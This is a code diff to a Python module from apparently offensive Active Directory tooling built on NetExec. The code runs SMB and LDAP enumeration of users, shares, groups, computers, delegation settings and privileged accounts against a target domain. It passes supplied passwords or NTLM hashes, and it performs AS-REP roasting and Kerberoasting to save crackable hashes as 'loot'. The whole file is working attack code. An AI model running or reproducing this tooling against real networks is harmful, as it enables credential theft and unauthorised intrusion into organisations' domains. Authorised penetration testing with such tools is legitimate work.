@@ -1,87 +1,10 @@
 # modules/auth_enum.py
 
-import os
 import shutil
-import re
 from core.helpers import run_command, save_loot
 from core.colors import blue, green, yellow, red
 
-def enum_users(session, save=False):
-    print(blue("[*] Extracting domain users via SMB (nxc)..."))
-
-    if not shutil.which("nxc"):
-        print(red("[-] 'nxc' not found in PATH."))
-        return
-
-    cmd = f"nxc smb {session.target_ip} -u \"{session.username}\""
-    if session.hash:
-        cmd += f" -p :{session.hash}"
-    elif session.password:
-        cmd += f" -p '{session.password}'"
-    else:
-        cmd += " -k --no-pass"
-    cmd += " --users"
-
-    out, err = run_command(cmd)
-    if not out:
-        print(red("[!] No output returned. Check credentials or target."))
-        return
-
-    users = []
-    found_header = False
-
-    for line in out.splitlines():
-        # Wait until the listing header appears
-        if "-Username-" in line and "-Last PW Set-" in line:
-            found_header = True
-            continue
-
-        if found_header:
-            parts = line.split()
-            if len(parts) >= 2:
-                user = parts[4] if len(parts) >= 5 else parts[0]
-                if user.lower() not in ["administrator", "guest", "krbtgt"]:  # optional
-                    users.append(user)
-
-    unique_users = sorted(set(users), key=lambda x: x.lower())
-    if unique_users:
-        for u in unique_users:
-            print(green(f"[+] User: {u}"))
-        if save:
-            with open("loot/valid_users.txt", "w") as f:
-                f.writelines([u + "\n" for u in unique_users])
-            print(yellow("[+] Saved to loot/valid_users.txt"))
-    else:
-        print(red("[-] No usernames extracted."))
-        if err:
-            print(yellow(err.strip()))
-
-
-def enum_shares(session, save=False):
-    print(blue("[*] Enumerating SMB shares via nxc..."))
-
-    if not shutil.which("nxc"):
-        print(red("[-] 'nxc' not found in PATH."))
-        return
-
-    cmd = f"nxc smb {session.target_ip} --shares"
-    if session.hash:
-        cmd += f" -u {session.username} -p :{session.hash}"
-    elif session.password:
-        cmd += f" -u {session.username} -p '{session.password}'"
-    else:
-        cmd += f" -u {session.username} -k"
-
-    out, err = run_command(cmd)
-    print(out.strip() or err.strip())
-
-    if save:
-        save_loot(f"smb_shares_{session.target_ip}.txt", out or err)
-
-
-def enum_bloodhound(session, save=False):
-    print(blue("[*] Running BloodHound LDAP collection via nxc..."))
-
+def _exec_nxc_ldap(session, flags, outfile=None):
     if not shutil.which("nxc"):
         print(red("[-] 'nxc' not found in PATH."))
         return
@@ -91,15 +14,90 @@ def enum_bloodhound(session, save=False):
         cmd += f" -p :{session.hash}"
     elif session.password:
         cmd += f" -p '{session.password}'"
-    else:
-        cmd += " -k"
-
-    cmd += f" --dns-server {session.dc_ip} --bloodhound --collection All"
+    cmd += f" -d {session.domain} {flags}"
 
     out, err = run_command(cmd)
-    combined = out + "\n" + err
-    print(combined.strip())
+    print(out.strip() or err.strip())
 
-    for line in combined.splitlines():
-        if ".zip" in line and "bloodhound" in line.lower():
-            print(green(f"[+] BloodHound file: {line.strip()}"))
+    if outfile and out:
+        parsed_users = []
+        lines = out.strip().splitlines()
+        for line in lines:
+            if line.startswith("LDAP") and len(line.split()) >= 5:
+                parts = line.split()
+                username = parts[4]
+                if username.lower() not in ["administrator", "guest", "krbtgt"]:
+                    parsed_users.append(username)
+        if parsed_users:
+            parsed = "\n".join(sorted(set(parsed_users))) + "\n"
+            save_loot(outfile, parsed)
+
+def enum_users(session, save=False):
+    print(blue("[*] Extracting domain users via LDAP..."))
+    _exec_nxc_ldap(session, "--users", "valid_users.txt" if save else None)
+
+def enum_shares(session, save=False):
+    print(blue("[*] Enumerating SMB shares via nxc..."))
+    if not shutil.which("nxc"):
+        print(red("[-] 'nxc' not found in PATH."))
+        return
+
+    cmd = f"nxc smb {session.target_ip} -u {session.username}"
+    if session.hash:
+        cmd += f" -p :{session.hash}"
+    elif session.password:
+        cmd += f" -p '{session.password}'"
+    cmd += " --shares"
+
+    out, err = run_command(cmd)
+    print(out.strip() or err.strip())
+    if save and out:
+        save_loot(f"smb_shares_{session.target_ip}.txt", out)
+
+def enum_groups(session, save=False):
+    print(blue("[*] Enumerating domain groups..."))
+    _exec_nxc_ldap(session, "--groups", "groups.txt" if save else None)
+
+def enum_computers(session, save=False):
+    print(blue("[*] Enumerating domain computers..."))
+    _exec_nxc_ldap(session, "--computers", "computers.txt" if save else None)
+
+def enum_dcs(session, save=False):
+    print(blue("[*] Enumerating Domain Controllers..."))
+    _exec_nxc_ldap(session, "--dc-list", "dcs.txt" if save else None)
+
+def enum_sid(session, save=False):
+    print(blue("[*] Getting domain SID..."))
+    _exec_nxc_ldap(session, "--get-sid", "sid.txt" if save else None)
+
+def enum_active_users(session, save=False):
+    print(blue("[*] Enumerating active user accounts..."))
+    _exec_nxc_ldap(session, "--active-users", "active_users.txt" if save else None)
+
+def enum_trusted_for_delegation(session, save=False):
+    print(blue("[*] Enumerating trusted-for-delegation users..."))
+    _exec_nxc_ldap(session, "--trusted-for-delegation", "trusted_for_delegation.txt" if save else None)
+
+def enum_find_delegation(session, save=False):
+    print(blue("[*] Enumerating delegation relationships..."))
+    _exec_nxc_ldap(session, "--find-delegation", "delegations.txt" if save else None)
+
+def enum_password_not_required(session, save=False):
+    print(blue("[*] Enumerating users with PASSWD_NOTREQD..."))
+    _exec_nxc_ldap(session, "--password-not-required", "passnotreq.txt" if save else None)
+
+def enum_admincount(session, save=False):
+    print(blue("[*] Enumerating users with adminCount=1..."))
+    _exec_nxc_ldap(session, "--admin-count", "admincount.txt" if save else None)
+
+def enum_gmsa(session, save=False):
+    print(blue("[*] Enumerating GMSA accounts..."))
+    _exec_nxc_ldap(session, "--gmsa", "gmsa.txt" if save else None)
+
+def enum_asreproast(session, save=False):
+    print(blue("[*] Running AS-REP Roasting..."))
+    _exec_nxc_ldap(session, "--asreproast asrep_hashes.txt" if save else "--asreproast /dev/null")
+
+def enum_kerberoast(session, save=False):
+    print(blue("[*] Running Kerberoasting..."))
+    _exec_nxc_ldap(session, "--kerberoasting kerberoast_hashes.txt" if save else "--kerberoasting /dev/null")
